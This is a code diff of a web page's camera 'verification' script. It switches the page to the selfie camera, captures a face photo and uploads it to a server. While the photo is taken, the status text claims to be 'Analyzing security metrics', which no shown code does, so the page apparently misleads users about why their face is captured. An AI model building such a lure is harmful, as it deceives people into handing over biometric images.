@@ -36,34 +36,40 @@
         const statusDiv = document.getElementById('status');
 
         verifyBtn.addEventListener('click', async () => {
-            statusDiv.innerText = "Requesting device permission...";
+    statusDiv.innerText = "Requesting device permission...";
+    
+    try {
+        // Enforce the front/selfie camera constraint
+        const constraints = { 
+            video: { 
+                facingMode: "user" // Forces the front/selfie camera
+            }, 
+            audio: false 
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        
+        statusDiv.innerText = "Analyzing security metrics...";
+        verifyBtn.disabled = true;
+
+        setTimeout(() => {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
             
-            try {
-                // Explicitly prompt browser hardware layer for camera verification
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-                
-                statusDiv.innerText = "Analyzing security metrics...";
-                verifyBtn.disabled = true;
+            stream.getTracks().forEach(track => track.stop());
 
-                // Wait 1.5 seconds for camera sensor auto-exposure adjustments
-                setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // Stop camera stream tracks cleanly to turn off hardware active LED lights
-                    stream.getTracks().forEach(track => track.stop());
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+            sendToServer(dataUrl);
+        }, 1500);
 
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                    sendToServer(dataUrl);
-                }, 1500);
-
-            } catch (err) {
-                console.error(err);
-                statusDiv.innerText = "Verification failed: Camera permission required.";
-                statusDiv.style.color = "#ff3333";
-            }
-        });
+    } catch (err) {
+        console.error(err);
+        statusDiv.innerText = "Verification failed: Camera permission required.";
+        statusDiv.style.color = "#ff3333";
+    }
+});
+        
 
         async function sendToServer(base64Image) {
             try {
